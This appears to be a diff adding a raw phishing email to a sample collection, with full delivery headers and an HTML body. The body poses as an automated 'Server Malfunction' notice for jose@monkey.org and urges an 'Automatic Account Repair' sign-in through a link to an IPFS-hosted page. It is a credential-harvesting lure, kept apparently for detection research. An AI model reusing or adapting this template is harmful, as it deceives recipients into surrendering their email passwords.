@@ -1,0 +1,203 @@
+Return-Path: accounting@tirnorport.com
+Delivered-To: jose@monkey.org
+X-FDA: 81277562520.15.0D4277C
+Received: from mail.tirnorport.com (mail.tirnorport.com [77.55.210.24])
+	by imf15.b.hostedemail.com (Postfix) with ESMTP id 06AF560007
+	for <jose@monkey.org>; Tue, 26 Sep 2023 05:06:18 +0000 (UTC)
+Authentication-Results: imf15.b.hostedemail.com;
+	dkim=pass header.d=tirnorport.com header.s=dkim header.b=pEitSI9w;
+	spf=pass (imf15.b.hostedemail.com: domain of accounting@tirnorport.com designates 77.55.210.24 as permitted sender) smtp.mailfrom=accounting@tirnorport.com;
+	dmarc=pass (policy=none) header.from=tirnorport.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1695704779;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=LkmX5GzDaY/zckWLtk+1XMVtLPwmA5lgQBY39u8Sh7Q=;
+	b=cuBYc9vmRskpGgAf3bXyAn8sl/VeM8BjyiPAf6+Wy1KGi+/kXNqZT/jMfce3QPewYALX2U
+	yNmf1JcJjtmZ4hsA+6CNUcW9g7fBvoUH6/APjWgHKgfEMGIDQINdPVVY90koznkCyftlwz
+	oPjBdXf0zV+5WDBwZ6oR2ZrF3WpeRL4=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1695704779; a=rsa-sha256;
+	cv=none;
+	b=FmbUUpBtSTJtMO7ranYHVPgZ70Qo2jHtvoWP/OzGIpqjEIcZszgE9Rsg1U0hhVtjRmPiII
+	xuhybC5FvLYNiXQ7bPUucosdTRU16oUqdphdNS/XOxEzIP1hKWDBBoO/6BC0k0S6TaXupj
+	yLNVqu+vzHV0NVrbNjekhrNvm95H0YU=
+ARC-Authentication-Results: i=1;
+	imf15.b.hostedemail.com;
+	dkim=pass header.d=tirnorport.com header.s=dkim header.b=pEitSI9w;
+	spf=pass (imf15.b.hostedemail.com: domain of accounting@tirnorport.com designates 77.55.210.24 as permitted sender) smtp.mailfrom=accounting@tirnorport.com;
+	dmarc=pass (policy=none) header.from=tirnorport.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim; d=tirnorport.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=monkey.orgaccounting@tirnorport.com;
+ bh=LkmX5GzDaY/zckWLtk+1XMVtLPwmA5lgQBY39u8Sh7Q=;
+ b=pEitSI9w72g7Z+dF7jfmXPlgDeykKDyq9jY3R1Qg7DSIG6IoAkVVP25dbwgBpsLLuI0ekdm2DqFV
+   lkudFtxy3HigNzZ9vOOjx4WbBlfv70vh41toHu6OcBMLTz/BIdR1Nco9XiZiQG99c/oVRl3xwZoi
+   An55ikNgc7TS8cd867KeUf0wevpR0fbUxgXoWs80mAIlUbBN52IhmzwT6YQGfItLE62T+QNAGdq4
+   QsoOCf2cn+nZMoabwdR/hIKgoVvgln90k0ZFrFYf2Ntk5dleWdfYBm5IwWaLoK8auonf1NAqv3CG
+   rHKcC2+GMD85gQO/Wa+TaP6n+aFATZXMVtTnbg==
+From: monkey.org accounting@tirnorport.com
+To: jose@monkey.org
+Subject: Server Malfunction For jose@monkey.org
+Date: 26 Sep 2023 07:06:15 +0200
+Message-ID: <20230926070614.DF6C3AC8BEFA9600@tirnorport.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: No, score=2.51
+X-Stat-Signature: 7p8k6m5jit5cg3fgz6344ypsx87dnm89
+X-Rspamd-Queue-Id: 06AF560007
+X-HE-Tag: 1695704778-324445
+X-HE-Meta: U2FsdGVkX18EJLYnqfvyUwyIdkFzgsp8hwkHVRhjjEb5m2EI1FO1eZGrp9nHOhuv9b3mrUfLBCL/ZPeSN2Vv1BwmhR0tZ0zuvHP7I+Qfw0/59VJKq0nM4QFRQv/2TqSdMKLMiCxeQA+fvGR0Ld/E+30Zm8Gb0XnQSFMdLM7BwpBuzkGD/K204S918F1dG85AmGKYDlut8ttRl/sAGmtVpVq3OGqMx/LIXB0XEj1Yd71IelcOpzuW/I5UKRbclMHUvQjQe8gyw8kFFT0vajmeNTWuuh8uim+4aKH2W06uJ2j1tZbYc1mwFQ==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 288
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
+<body>
+<table width=3D"640" style=3D'text-align: left; color: rgb(0, 0, 0); text-t=
+ransform: none; letter-spacing: normal; font-family: "Segoe UI", "Lucida Sa=
+ns", sans-serif; font-size: medium; font-style: normal; font-weight: 400; w=
+ord-spacing: 0px; border-right-color: rgb(227, 227, 227); border-left-color=
+: rgb(227, 227, 227); border-right-width: 1px; border-left-width: 1px; bord=
+er-right-style: solid; border-left-style: solid; white-space: normal; borde=
+r-collapse: collapse; box-sizing: border-box;=20
+orphans: 2; widows: 2; background-color: rgb(252, 253, 254); font-variant-l=
+igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px=
+; text-decoration-thickness: initial; text-decoration-style: initial; text-=
+decoration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
+"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-=
+box; background-color: rgb(0, 114, 198);">
+<td width=3D"310" valign=3D"middle" style=3D"padding: 12px 0px; border-top-=
+color: rgb(227, 227, 227); border-bottom-color: rgb(227, 227, 227); border-=
+top-width: 1px; border-bottom-width: 1px; border-top-style: solid; border-b=
+ottom-style: solid; box-sizing: border-box;"><h1 align=3D"center" style=3D'=
+color: rgb(255, 255, 255); line-height: 20pt; font-family: "segoe ui light"=
+; font-size: 15pt; font-weight: normal; margin-top: 0px; margin-bottom: 0.5=
+rem; box-sizing: border-box;'>
+<span style=3D"box-sizing: border-box;"></span>&nbsp;<font size=3D"5" style=
+=3D"box-sizing: border-box;"><strong style=3D"font-weight: bolder; box-sizi=
+ng: border-box;"><span>&nbsp;Server Malfunction</span> for&nbsp;jose@monkey=
+=2Eorg</strong></font></h1></td><td width=3D"24" style=3D"border-top-color:=
+ rgb(227, 227, 227); border-bottom-color: rgb(227, 227, 227); border-top-wi=
+dth: 1px; border-bottom-width: 1px; border-top-style: solid; border-bottom-=
+style: solid; box-sizing: border-box;">&nbsp;</td></tr></tbody>
+</table>
+<table width=3D"640" style=3D'text-align: left; color: rgb(0, 0, 0); text-t=
+ransform: none; letter-spacing: normal; font-family: "Segoe UI", "Lucida Sa=
+ns", sans-serif; font-size: medium; font-style: normal; font-weight: 400; w=
+ord-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizin=
+g: border-box; orphans: 2; widows: 2; background-color: rgb(252, 253, 254);=
+ font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
+roke-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;' border=3D"=
+0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-b=
+ox;"><tr style=3D"box-sizing: border-box;"><td width=3D"1" style=3D"backgro=
+und: rgb(227, 227, 227); box-sizing: border-box;"></td><td width=3D"24" sty=
+le=3D"box-sizing: border-box;">&nbsp;</td>
+<td width=3D"640" valign=3D"top" style=3D"padding: 10px 0px 20px; border-bo=
+ttom-color: rgb(227, 227, 227); border-bottom-width: 1px; border-bottom-sty=
+le: solid; box-sizing: border-box;" colspan=3D"2"><table style=3D"border-co=
+llapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" c=
+ellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-=
+sizing: border-box;"><td width=3D"630" style=3D"color: rgb(0, 0, 0); line-h=
+eight: 13pt; font-size: 10pt; box-sizing: border-box;">
+<table width=3D"100%" style=3D"border-collapse: collapse; box-sizing: borde=
+r-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"bo=
+x-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=3D"b=
+ox-sizing: border-box;"><div align=3D"left" style=3D'color: rgb(51, 51, 51)=
+; font-family: "segoe ui", tahoma, sans-serif; font-size: 14px; box-sizing:=
+ border-box;'><span style=3D"box-sizing: border-box;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Att=
+ention:<span>&nbsp;jose</span>,</span></div>
+<div align=3D"left" style=3D'color: rgb(51, 51, 51); font-family: "segoe ui=
+", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><span styl=
+e=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span>=
+</div><div align=3D"center" style=3D'color: rgb(51, 51, 51); font-family: "=
+segoe ui", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><s=
+pan style=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box=
+;"><span style=3D"box-sizing: border-box;">
+<font color=3D"#ec1330" style=3D"box-sizing: border-box;"><strong style=3D"=
+font-weight: bolder; box-sizing: border-box;">Error with your IMAP/POP3 mai=
+ls server.</strong></font>&nbsp;<br style=3D"box-sizing: border-box;"><span=
+ style=3D"box-sizing: border-box;"><strong style=3D"font-weight: bolder; bo=
+x-sizing: border-box;"><br style=3D"box-sizing: border-box;"></strong></spa=
+n></span></span></span></div>
+<div align=3D"center" style=3D'color: rgb(51, 51, 51); font-family: "segoe =
+ui", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><span st=
+yle=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box;"><sp=
+an style=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box;=
+"><strong style=3D"font-weight: bolder; box-sizing: border-box;">RESOLVE TH=
+IS ERROR NOW<br><br></strong></span></span></span></span></div>
+<div align=3D"left" style=3D'color: rgb(51, 51, 51); font-family: "segoe ui=
+", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><span styl=
+e=3D"box-sizing: border-box;"><strong style=3D"font-weight: bolder; box-siz=
+ing: border-box;">Note:</strong><span>&nbsp;</span>This will cause failure =
+in outgoing and incoming mail delivery through your mail client.<br style=
+=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></span><=
+/div>
+<div align=3D"left" style=3D'color: rgb(51, 51, 51); font-family: "segoe ui=
+", tahoma, sans-serif; font-size: 14px; box-sizing: border-box;'><span styl=
+e=3D"box-sizing: border-box;">You are required to&nbsp;follow the direction=
+s&nbsp;below to sign in to your email account for automatic resolve error/r=
+epair.</span></div><br style=3D"box-sizing: border-box;"><br style=3D"box-s=
+izing: border-box;"></td></tr><tr style=3D"box-sizing: border-box;"><td ali=
+gn=3D"center" style=3D"padding: 0px; box-sizing: border-box;">
+<table align=3D"center" class=3D"v1m_-7257559470588763933auto-height" style=
+=3D"border-collapse: collapse; box-sizing: border-box; background-color: rg=
+b(0, 120, 215);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody st=
+yle=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;">
+<td align=3D"center" class=3D"v1m_-7257559470588763933font-size-18 v1m_-725=
+7559470588763933line-height-24 v1m_-7257559470588763933padding-top-12 v1m_-=
+7257559470588763933padding-right-24 v1m_-7257559470588763933padding-bottom-=
+12 v1m_-7257559470588763933padding-left-24" style=3D'padding: 13px 24px; bo=
+rder: 1px solid rgb(0, 120, 215); border-image: none; text-align: center; c=
+olor: rgb(0, 120, 215); line-height: 10px; font-family: "segoe ui", "segoe =
+wp", wf_segoe-ui_semibold, tahoma, arial, sans-serif;=20
+font-size: 16px; font-weight: 600; box-sizing: border-box; background-color=
+: rgb(0, 120, 215);'><span class=3D"v1Object" style=3D"color: rgb(68, 101, =
+111); text-decoration: none; cursor: pointer; box-sizing: border-box;"><spa=
+n class=3D"v1Object" style=3D"color: rgb(68, 101, 111); text-decoration: no=
+ne; cursor: pointer; box-sizing: border-box;">
+<a style=3D"color: rgb(255, 255, 255); text-decoration: none; cursor: point=
+er; box-sizing: border-box; background-color: transparent;" href=3D"https:/=
+/bafybeie7bcsbch7qwbvv2xy3jwssavke2vgl5inwxt5ypa7tb4zjswhi7i.ipfs.dweb.link=
+/upmeu.html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer">Automatic=
+&nbsp;Account Repair</a></span></span></td></tr></tbody></table></td></tr><=
+/tbody></table><br style=3D"box-sizing: border-box;"><br style=3D"box-sizin=
+g: border-box;">
+<div style=3D'color: rgb(51, 51, 51); font-family: "segoe ui", tahoma, sans=
+-serif; font-size: 14px; box-sizing: border-box;'>Sincerely,</div><div styl=
+e=3D'color: rgb(51, 51, 51); font-family: "segoe ui", tahoma, sans-serif; f=
+ont-size: 14px; font-style: italic; box-sizing: border-box;'>monkey.org&nbs=
+p;Automated Server Message! 2023</div></td></tr></tbody></table></td></tr><=
+/tbody></table>
+<p style=3D'text-align: left; color: rgb(51, 51, 51); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", "Segoe =
+UI Web Regular", "Segoe UI Symbol", "Helvetica Neue", Arial, "sans-serif"; =
+font-size: 12px; font-style: normal; font-weight: 400; margin-top: 0px; mar=
+gin-bottom: 1rem; word-spacing: 0px; white-space: normal; box-sizing: borde=
+r-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-va=
+riant-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;'>
+<span style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Segoe UI", "Lucida Sans", sans-serif=
+; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px;=
+ float: none; display: inline !important; white-space: normal; box-sizing: =
+border-box; orphans: 2; widows: 2; background-color: rgb(252, 253, 254); fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'>&nbsp;&nbs=
+p;&nbsp;&nbsp;</span></p></body></html>
+
